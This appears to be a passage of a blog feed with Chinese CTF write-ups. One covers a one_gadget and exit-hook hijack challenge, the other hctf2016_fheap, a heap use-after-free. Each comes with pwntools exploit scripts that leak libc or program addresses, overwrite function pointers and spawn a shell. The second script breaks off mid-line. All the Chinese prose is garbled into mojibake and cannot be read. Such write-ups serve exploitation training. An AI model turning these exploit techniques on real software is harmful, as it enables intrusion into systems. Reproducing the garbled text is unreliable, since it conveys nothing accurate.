src="/../img/2706180-20220323150701120-590746669.png"></p><p>å¯ä»¥å‘ç°libcåŸºåœ°å€åªæœ‰åä¸€ä¸ªå­—èŠ‚æ˜¯00ï¼Œå€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚å¹¶ä¸å®Œå…¨æ˜¯0ï¼Œå› æ­¤æˆ‘ä»¬å‡5çš„è¯ï¼Œå°†one_gadgetæŒ‡ä»¤æŠ¬é«˜ä¸€ä¸ªæŒ‡ä»¤ï¼Œè¿™æ ·æœ€åä¸€ä¸ªå­—èŠ‚ç»•è¿‡äº†æ£€æŸ¥ï¼Œè€Œå€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚åŠ ä¸ŠlibcåŸºåœ°å€ä¹‹åï¼Œä¹Ÿå¯ä»¥ç»•è¿‡æ£€æŸ¥ã€‚</p><h2 id="åšé¢˜æ€è·¯"><a href="#åšé¢˜æ€è·¯" class="headerlink" title="åšé¢˜æ€è·¯"></a>åšé¢˜æ€è·¯</h2><p>è¿™é“é¢˜æ˜æ˜¾çœ‹å‡ºæ¥ä¹Ÿæ²¡æœºä¼šå†ä¼ å‚äº†ï¼Œé‚£å°±è€ƒè™‘one_gadgetï¼ˆæˆ‘ä»¬æ˜¯çŸ¥é“libcåŸºåœ°å€çš„ï¼‰ã€‚ç”±äºè¿˜å¯ä»¥ä»»æ„åœ°å€ä»»æ„å†™ä¸‰å­—èŠ‚ï¼Œæˆ‘æ˜¯ä¼˜å…ˆè€ƒè™‘çš„ä¿®æ”¹å‡½æ•°gotè¡¨ï¼Œ<strong>ä½†æ˜¯å¾ˆå¿«å°±ä¼šå‘ç°ç¨‹åºæ˜¯å¼€äº†PIEä¿æŠ¤çš„ã€‚gotåœ°å€å¹¶ä¸æ˜¯å›ºå®šçš„</strong>ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜æ³„éœ²ä¸äº†æ ˆåœ°å€ï¼Œå› æ­¤è¿™ä¸ªæ–¹æ³•å°±è¢«æˆ‘æ‰“æ¶ˆäº†ã€‚ä½†æ˜¯æˆ‘ä»¬æ˜¯çŸ¥é“libcåŸºåœ°å€çš„ï¼Œå› æ­¤æˆ‘ä»¬ç°åœ¨çš„æ€è·¯æ˜¯æƒ³åŠæ³•å»libcé‡Œé¢æ‰¾ä¸ªæŒ‡é’ˆï¼ˆè¿™ä¸ªæŒ‡é’ˆè¿˜å¿…é¡»æŒ‡å‘ä¸€ä¸ªè¢«æ‰§è¡Œçš„åœ°å€ï¼‰ï¼Œç„¶åé€šè¿‡è¿™ä¸ªæŒ‡é’ˆå°†one_gadgetå†™å…¥æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°æ–¹ï¼Œæœ€åè·å–shellã€‚</p><h2 id="å…³é”®çŸ¥è¯†ç‚¹"><a href="#å…³é”®çŸ¥è¯†ç‚¹" class="headerlink" title="å…³é”®çŸ¥è¯†ç‚¹"></a>å…³é”®çŸ¥è¯†ç‚¹</h2><p>é€šè¿‡è°ƒè¯•å‘ç°äº†æœ‰ä¸‰ä¸ªåœ°æ–¹éƒ½å…·å¤‡è¿™æ ·çš„æŒ‡é’ˆã€‚</p><p>â‘ putså‡½æ•°è°ƒç”¨äº†__strlen_sse2</p><p><img src="/../img/2706180-20220323150714090-172999789.png"></p><p>æ­¤æ—¶è¯¥å‡½æ•°å·²ç»åœ¨æˆ‘ä»¬çš„åŠ¨æ€åº“é‡Œé¢äº†ï¼Œå¹¶ä¸”<strong>å†æ¬¡jmpåˆ° rip+0x3c9f12æ‰€æŒ‡å‘çš„åœ°æ–¹</strong>ï¼Œé‚£æˆ‘ä»¬åªéœ€è¦ä»¥rip+0x3c9f12çš„åœ°å€ä½œä¸ºè·³æ¿ï¼Œå»å°†å®ƒæ‰€æŒ‡å‘çš„åœ°æ–¹æœ€åä¸‰å­—èŠ‚ä¿®æ”¹ä¸ºonegadgetå³å¯ï¼ˆç”±äºlibcä¸­çš„åœ°å€éƒ½æ˜¯ä»¥libcåŸºåœ°å€åŠ åç§»æ¥å¯»å€ï¼Œè¿™ä¸ªåç§»å°±å æœ€åçš„ä¸‰å­—èŠ‚ï¼ˆå‰é¢çš„åŸºåœ°å€å¤§å®¶éƒ½ä¸€æ ·ï¼Œå› æ­¤åªä¿®æ”¹ä¸‰å­—èŠ‚å³å¯ï¼‰ã€‚</p><p><img src="/../img/2706180-20220323150723849-815330213.png"></p><p>è¦ä¿®æ”¹çš„åœ°å€è·ç¦»libcåŸºåœ°å€åç§»ä¸º0x3eb0a2</p><p>â‘¡   dlopenå‡½æ•°â€”&gt;_dlerror_runå‡½æ•°â€”&gt;_dl_catch_errorå‡½æ•°</p><p><img src="/../img/2706180-20220323150734638-471411632.png"></p><p>è¿™é‡ŒåŸç†åŒä¸Šï¼Œæ­¤æ—¶è·³åˆ°äº†rip+0x2022a2<strong>æ‰€æŒ‡å‘çš„åœ°æ–¹</strong>ã€‚</p><p><img src="/../img/2706180-20220323150747907-243602693.png"></p><p>è¦ä¿®æ”¹çš„åœ°å€ï¼Œè·ç¦»libcåŸºåœ°å€åç§»0x5f4038</p><p>â‘¢ä¹Ÿæ˜¯æˆ‘æƒ³é‡ç‚¹è®²çš„exit hookåŠ«æŒã€‚</p><p>exitå‡½æ•°çš„è°ƒç”¨æµç¨‹exitå‡½æ•°â€”&gt;__run_exit_handlerså‡½æ•°â€”&gt;_dl_finiå‡½æ•°â€”&gt; _dl_rtld_lock_recursiveæŒ‡é’ˆï¼ˆè¿™æ˜¯ä¸ªç»“æ„ä½“æŒ‡é’ˆå˜é‡ï¼‰</p><p><img src="/../img/2706180-20220323150757504-1460403787.png"></p><p>è€Œ_dl_rtld_lock_recursiveè¿™ä¸ªæŒ‡é’ˆåˆæŒ‡å‘äº† __rtld_lock_default_lock_recursive</p><p><img src="/../img/2706180-20220323150807027-834730342.png"><br><img src="/../img/2706180-20220323150832405-1323272271.png"></p><p>å¯ä»¥çœ‹åˆ°æœ€ååˆæ‰§è¡Œäº†è¿™ä¸ª __rtld_lock_default_lock_recursive</p><p>å› æ­¤æˆ‘ä»¬å°±æŠŠè¿™ä¸ª_dl_rtld_lock_recursiveæŒ‡é’ˆå½“åšè·³æ¿ï¼Œå»å°†å®ƒæŒ‡å‘çš„å†…å®¹ï¼ˆ__rtld_lock_default_lock_recursiveï¼‰ä¹Ÿå°±æ˜¯ä¿®æ”¹ä¸ºone_gadgetã€‚</p><p><img src="/../img/2706180-20220323150844014-384704368.png"></p><p>å› æ­¤è¿™ä¸ªrtld_lock_default_lock_recursiveæŒ‡é’ˆè·ç¦»libcåŸºåœ°å€çš„åç§»ä¸º0x81df60ã€‚</p><p>è¿™é‡Œæˆ‘å› ä¸ºlibcçš„ç‰ˆæœ¬å¡äº†å¾ˆä¹…ï¼ŒåŸå…ˆæˆ‘é‚£ä¸ªä¹Ÿæ˜¯2.27ï¼Œä¸è¿‡å¥½åƒæ˜¯å°ç‰ˆæœ¬ä¸åŒï¼Œæœ€åå¾—å‡ºæ¥çš„åç§»å’ŒæœåŠ¡å™¨é‚£è¾¹ç‰ˆæœ¬çš„åç§»å·®äº†0x1000ã€‚</p><h2 id="patch-libcå’Œldè¿‡ç¨‹"><a href="#patch-libcå’Œldè¿‡ç¨‹" class="headerlink" title="patch libcå’Œldè¿‡ç¨‹"></a>patch libcå’Œldè¿‡ç¨‹</h2><p><a href="https://blog.csdn.net/qq_41560595/article/details/114597342">https://blog.csdn.net/qq_41560595/article/details/114597342</a></p><p>è¿™ç¯‡æ–‡ç« å¾ˆè¯¦ç»†çš„è®°å½•äº†patch libcå’Œldçš„è¿‡ç¨‹ã€‚</p><p>æˆ‘æ ¹æ®è¿™ç¯‡æ–‡ç« å†åšä¸€ç‚¹è¡¥å……</p><p>æƒ³è¦ä¸‹è½½æŸä¸ªç‰ˆæœ¬çš„libcæ—¶ï¼Œå…ˆcat listï¼ˆæ­¤æ—¶åº”è¯¥å…ˆçœ‹ä¸Šé¢é‚£ç¯‡æ–‡ç« ï¼Œå…ˆä¸‹è½½ä¸‹æ¥glibc-all-in-one</p><p><img src="/../img/2706180-20220323150858134-535564640.png"></p><p><img src="/../img/2706180-20220323150907265-2010357906.png"></p><p>.&#x2F;downloadå»ä¸‹è½½ä¸‹æ¥ä½ æƒ³è¦çš„libcç‰ˆæœ¬ï¼ˆè¿™é“é¢˜åº”è¯¥é€‰ä¸Šå›¾çš„è¿™ä¸ªç‰ˆæœ¬ï¼‰</p><p><img src="/../img/2706180-20220323150916892-736455012.png"></p><p>ç„¶åä¸Šé¢é‚£ç¯‡æ–‡ç« ä¸­ï¼Œè¿™å‡ ä¸ªçº¢è‰²æ¡†çš„éƒ¨åˆ†ï¼Œæ˜¯æ ¹æ®è‡ªå·±çš„è·¯å¾„æ¥é…ç½®ï¼ˆåˆ«å‚»å‚»çš„å…¨å¤åˆ¶ç²˜è´´äº†ï¼‰(ä¸æ˜¯çº¢æ¡†çš„ï¼Œä¸€å¾‹ä¸ç”¨æ”¹ï¼‰</p><p><strong>è¿™æ ·åšçš„å¥½å¤„å°±æ˜¯ï¼Œæœ¬åœ°ç¨‹åºæ‰€ä¾èµ–çš„libcåº“å’Œè¿œç¨‹çš„libcæ˜¯ä¸€æ ·çš„ï¼Œè¿™æ ·æ‹¿åˆ°çš„å…³äºlibcåŸºåœ°å€çš„ä»»ä½•åç§»æœ¬åœ°ä¸è¿œç¨‹å°±éƒ½æ˜¯ä¸€æ ·çš„äº†ã€‚</strong></p><p>å¦‚æœé‡è§ä¸‹é¢è¿™ç§æŠ¥é”™çš„è¯<br><img src="/../img/2706180-20220403102819721-1715294586.png"><br>åœ¨ä¸‹è½½å®Œpatchelfä¹‹åï¼Œè¿›å…¥patchelfçš„ç›®å½•ï¼Œç”¨ä¸‹é¢è¿™ä¸ªå‘½ä»¤å®‰è£…ä¸€ä¸ªå·¥å…·ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install autoconf automake libtool</span><br></pre></td></tr></table></figure><p>ç„¶åå†è¾“å…¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">make check</span><br></pre></td></tr></table></figure><p>ä¹‹åå°±okäº†ã€‚</p><h2 id="å†è¯´å…³äºatoiå‡½æ•°çš„é‚£ä¸ªå‘ã€‚"><a href="#å†è¯´å…³äºatoiå‡½æ•°çš„é‚£ä¸ªå‘ã€‚" class="headerlink" title="å†è¯´å…³äºatoiå‡½æ•°çš„é‚£ä¸ªå‘ã€‚"></a>å†è¯´å…³äºatoiå‡½æ•°çš„é‚£ä¸ªå‘ã€‚</h2><p>ç»“è®º</p><p><strong>é‡è§atolå‡½æ•°çš„æ—¶å€™ï¼Œè¦å‘æ‰“åŒ…å‰çš„æ•°æ®ï¼Œè€Œä¸æ˜¯æ‰“åŒ…åçš„æ•°æ®</strong></p><p>å› ä¸ºä¼ ç»™atolçš„å‚æ•°ä¼šè¢«é‡è§ç¬¬ä¸€ä¸ªä¸æ˜¯0~9çš„å­—ç¬¦æ‰€æˆªæ–­ ä»è€Œè¿”å›ä¹‹å‰çš„å€¼ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œä½ æƒ³æ‰“åŒ…çš„æ•°æ®æ˜¯1234ï¼Œé‚£ä¹ˆè¢«æ‰“åŒ…ä¹‹åå°±æ˜¯\x04\x03\x02\x01ï¼Œè¿™äº›éƒ½æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œä¼ å…¥atolä¹‹åç›´æ¥å°±è¢«æˆªæ–­ï¼Œå¯¼è‡´atolè¿”å›å€¼ä¸º0ï¼Œä½¿å¾—åç»­çš„æµç¨‹æ˜¯é”™è¯¯çš„ã€‚</p><p><img src="/../img/2706180-20220323150926759-1085603692.png"></p><p>exp</p><p>æ‰“è¿œç¨‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27125</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b * $rebase(0xd63)\nc&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">puts_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ggg=libc_base+<span class="number">0x81df60</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ggg))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">sss=<span class="built_in">str</span>(ggg)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;shoot!shoot!\n&quot;</span>, sss)</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f322</span>-<span class="number">5</span></span><br><span class="line"><span class="comment">#list=p64(one_gadget)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;biang!\n&quot;</span>, <span class="built_in">chr</span>(one_gadget &amp; <span class="number">0xff</span>))<span class="comment">#chrç›®çš„æ˜¯å°†16è¿›åˆ¶è½¬åŒ–æˆä¸€ä¸ªå­—èŠ‚å‘è¿‡å»</span></span><br><span class="line">    one_gadget = one_gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰“æœ¬åœ°</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p, &#x27;b * $rebase(0xd63)\nc&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">puts_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;xiamian&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">strlen=libc_base+<span class="number">0x3eb0a8</span><span class="comment">#è¿™é‡Œæˆ‘æœ€å¼€å§‹è°ƒè¯•å¾—åˆ°çš„åç§»æ˜¯è¿™ä¸ª0x3eb0a8ï¼ˆå½“æ—¶æˆ‘ç”¨çš„æ˜¯æœ¬æœºè‡ªå¸¦çš„libcï¼‰,ç„¶åpatchå¦ä¸€ä¸ªlibcä¹‹åï¼Œå°±å˜æˆ0x3eb0a2äº†ï¼ˆæˆ‘æœ€å¼€å§‹ç”¨0x3eb0a8æ˜¯æ‰“é€šäº†çš„ï¼‰</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(p64(puts_addr))</span><br><span class="line">sss=<span class="built_in">str</span>(strlen)</span><br><span class="line">p.sendline(sss)</span><br><span class="line">one_gadget=libc_base+<span class="number">0xe54fe</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;biang!\n&quot;</span>, <span class="built_in">chr</span>(one_gadget &amp; <span class="number">0xff</span>))</span><br><span class="line">    one_gadget = one_gadget &gt;&gt; <span class="number">8</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å¦‚æœå¤åˆ¶ç²˜è´´è¿˜æ‰“ä¸é€šçš„è¯ï¼Œä¹æˆä¹æ˜¯libcç‰ˆæœ¬çš„é—®é¢˜ï¼ˆæœ¬äººå°±ä¸€èœé¸¡ï¼Œå¦‚æœå†™çš„å“ªæœ‰é—®é¢˜ï¼Œæ¬¢è¿æŒ‡æ­£ï¼‰ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> åŠ«æŒexit_hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hctf2016_fheap</title>
      <link href="/posts/f50f2cd6.html"/>
      <url>/posts/f50f2cd6.html</url>
      
        <content type="html"><![CDATA[<h3 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢:"></a>å†™åœ¨å‰é¢:</h3><p>æœ¬é¢˜ä¸ºä¸€é“ç»å…¸çš„æ§åˆ¶å †å—çš„é¢˜ç›®ï¼Œå¯¹äºè¿™ç±»é¢˜ç›®é€šå¸¸çš„æ–¹æ³•æ˜¯å°†æ§åˆ¶å †å—ç”³è¯·å‡ºæ¥å½“åšç”¨æˆ·å †å—æ¥ä½¿ç”¨ï¼Œå‘å…¶å†™å…¥ç‰¹å®šæ•°æ®æ¥ç¯¡æ”¹å…¶ä¸­çš„å‡½æ•°æŒ‡é’ˆã€‚</p><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211122218987.png" alt="image-20221112221838443"></p><h3 id="ç¨‹åºåˆ†æï¼š"><a href="#ç¨‹åºåˆ†æï¼š" class="headerlink" title="ç¨‹åºåˆ†æï¼š"></a>ç¨‹åºåˆ†æï¼š</h3><blockquote><p>ä¸€ä¸ªå †å—Aä¸­è®°å½•äº†å¦ä¸€ä¸ªå †å—Bçš„åœ°å€ï¼Œè€Œshowã€editã€deleteå‡½æ•°æ˜¯é€šè¿‡è®¿é—®å †å—Aä¸­çš„å †å—Bçš„åœ°å€æ¥è¿›è¡Œç›¸åº”çš„æ“ä½œï¼Œæˆ‘å°†è¿™ç±»å †å—Aç§°ä¹‹ä¸ºæ§åˆ¶å †å—</p></blockquote><p>æœ¬é¢˜åªæœ‰addå’Œdeleteå‡½æ•°ï¼Œè€Œdeleteå‡½æ•°çš„é‡Šæ”¾å †å—å¤„æ˜¯é€šè¿‡æ§åˆ¶å †å—ä¸­å­˜æ”¾çš„freeå‡½æ•°çš„æŒ‡é’ˆæ¥å®ç°çš„ã€‚åˆ†æaddå‡½æ•°åï¼Œå¯ä»¥çŸ¥é“æ§åˆ¶å †å—çš„ç»“æ„å¦‚ä¸‹:</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211122227841.png" alt="image-20221112222749786"></p><p>æœ¬é¢˜çš„libcç‰ˆæœ¬ä¸º2.23ï¼Œå­˜åœ¨çš„æ¼æ´ä¸ºUAFï¼Œç¨‹åºæ‰€ç”³è¯·çš„æ§åˆ¶å †å—æœ€ç»ˆçš„å¤§å°æ˜¯0x30.</p><h3 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><p>é€šå¸¸å¯¹äºæ§åˆ¶å †å—ç›¸å…³çš„é¢˜ç›®(è¦å­˜åœ¨UAFæ¼æ´)ï¼Œæˆ‘ä»¬é¦–å…ˆè€ƒè™‘èƒ½å¦å°†æ§åˆ¶å †å—ç»™ç”³è¯·å‡ºæ¥ï¼Œé€šå¸¸çš„ç­–ç•¥æ˜¯å°†ä¸¤ä¸ªæ§åˆ¶å †å—ç»™é‡Šæ”¾æ‰ï¼Œç„¶åç”³è¯·ä¸€ä¸ªå’Œæ§åˆ¶å †å—ç­‰å¤§çš„å †å—ï¼ŒåŠ ä¸Šä¸€ä¸ªæ§åˆ¶å †å—ï¼Œè¿™æ ·åŸæœ¬çš„ä¸¤ä¸ªæ§åˆ¶å †å—å°±å…¨å‡ºæ¥äº†ï¼Œå› ä¸ºUAFæ¼æ´çš„åŸå› ï¼Œæˆ‘ä»¬å¯ä»¥å¾€åˆšç”³è¯·å‡ºæ¥çš„ç”¨æˆ·å †å—ä¸­å†™å…¥æ•°æ®(è€Œå®ƒè¿˜æ˜¯å¦ä¸€ç»„å †å—ä¸­çš„æ§åˆ¶å †å—)ï¼Œä»è€Œç¯¡æ”¹æ§åˆ¶å †å—ä¸­çš„å‡½æ•°æŒ‡é’ˆã€‚</p><p>æ³¨æ„ï¼š</p><ol><li>é¦–å…ˆæˆ‘ä»¬ç”³è¯·å †å—çš„å¤§å°æ˜¯ç”±è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦æ¥å†³å®šçš„(å¦‚æœå‡ºç°äº†00ä¼šæŠŠstrlenå‡½æ•°ç»™æˆªæ–­)</li><li>ç”³è¯·å †å—æ—¶ï¼Œç»™bssæ®µå­˜çš„æ˜¯æ§åˆ¶å †å—çš„åœ°å€ã€‚è€Œè¿™ä¸ªç´¢å¼•çš„åˆ†é…æ˜¯é€‰æ‹©äº†å½“å‰ç¬¬ä¸€ä¸ªç©ºé—²çš„æ ‡å¿—ä½ä¸º0çš„å †å—åœ°å€è¿›è¡Œåˆ†é…ã€‚ä¸¾ä¸ªä¾‹å­å¦‚æœæˆ‘å…ˆç”³è¯·äº†å †å—Aå’Œå †å—Bï¼Œç„¶åé‡Šæ”¾æ‰å †å—Açš„è¯ï¼Œå†æ¬¡ç”³è¯·ä¸€ä¸ªå †å—ï¼Œè¯¥æ§åˆ¶å †å—çš„åœ°å€ä¼šè¦†ç›–åŸæœ¬å †å—Açš„æ§åˆ¶å †å—**(è€Œéå› ä¸ºUAFï¼Œåœ¨å †å—Bä¹‹ååˆ†é…ä¸€ä¸ªæ–°çš„åœ°å€)**</li></ol><p>ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬åšå¦‚ä¸‹å¸ƒå±€:</p><p>ç”³è¯·å †å—Aå’Œå †å—B(ç”±äºè¾“å…¥çš„æ•°æ®å°äº0xfï¼Œå› æ­¤ä¸ä¼šåˆ›å»ºå‡ºæ¥ç”¨æˆ·å †å—ï¼Œæ­¤æ—¶å †å—Aå’Œå †å—Bä¸ºæ§åˆ¶å †å—)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211122343486.png" alt="image-20221112234354615" style="zoom:50%;" /><p>æ¥ç€æˆ‘ä»¬ç”³è¯·å‡ºæ¥ä¸€ä¸ªä¸æ§åˆ¶å †å—ç­‰å¤§çš„å †å—(å¦‚ä¸‹) </p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211130852198.png" alt="image-20221113085209676"></p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ§åˆ¶0x555555759030è¿™ä¸ªå †å—é‡Œçš„å‡½æ•°æŒ‡é’ˆ(å› ä¸ºå®ƒä½äºbssæ®µï¼Œæ‰€ä»¥è¿˜å¯ä»¥è¢«å½“åšæ§åˆ¶å †å—ä½¿ç”¨)ï¼ŒåŸæœ¬å †å—ä¸­å°±æ®‹ç•™äº†ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œæˆ‘ä»¬ä¿®æ”¹åä¸¤ä¸ªå­—èŠ‚(çˆ†ç ´åŠä¸ªå­—èŠ‚)ï¼Œå†™å…¥putså‡½æ•°çš„pltåœ°å€ã€‚æ¥æ³„éœ²ç¨‹åºåŸºåœ°å€(putså‡½æ•°æ‰§è¡Œæ—¶ä¼šå°†0x18ä¸ªaä»¥åŠåé¢çš„putsçš„pltåœ°å€å…¨éƒ¨æ‰“å°å‡ºæ¥)</p><p>æ­¤æ—¶çš„payloadä¸º:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x4990</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><p>è€Œä¹‹åçš„æ“ä½œï¼Œå…¨éƒ½å¦‚æ³•ç‚®åˆ¶ã€‚å»åŠ«æŒå‡½æ•°æŒ‡é’ˆè¿›è¡Œç¯¡æ”¹ï¼Œå…ˆæ³„éœ²libcåœ°å€(æ”¹å‡½æ•°æŒ‡é’ˆä¸ºprintfå‡½æ•°çš„pltè¡¨ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥æ³„éœ²libc(åªæ§åˆ¶printfå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å³å¯))ï¼Œå†æ§åˆ¶å‡½æ•°æŒ‡é’ˆä¸ºsystemåœ°å€ï¼Œå‚æ•°ç»™ä¸€ä¸ª&#x2F;bin&#x2F;sh;å³å¯ã€‚ ä½¿ç”¨&#x2F;bin&#x2F;sh;è€Œæ²¡æœ‰ä½¿ç”¨&#x2F;bin&#x2F;sh\x00çš„åŸå› æ˜¯å› ä¸ºé¿å…å­—ç¬¦ä¸²ä¸­é—´å‡ºç°00ä½¿å­—ç¬¦ä¸²è¢«æˆªæ–­ã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;3.quit\n&quot;</span>,<span class="string">&#x27;create &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Pls give string size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;str:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;3.quit\n&quot;</span>,<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Pls give me the string id you want to delete\nid:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Are you sure?:&quot;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x4990</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,payload)</span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xCED</span>,<span class="number">0xCC2</span>,<span class="number">0xE93</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">    leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_addr&#x27;</span>)</span><br><span class="line">    base_addr=leak_addr-<span class="number">0x990</span></span><br><span class="line">    log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span 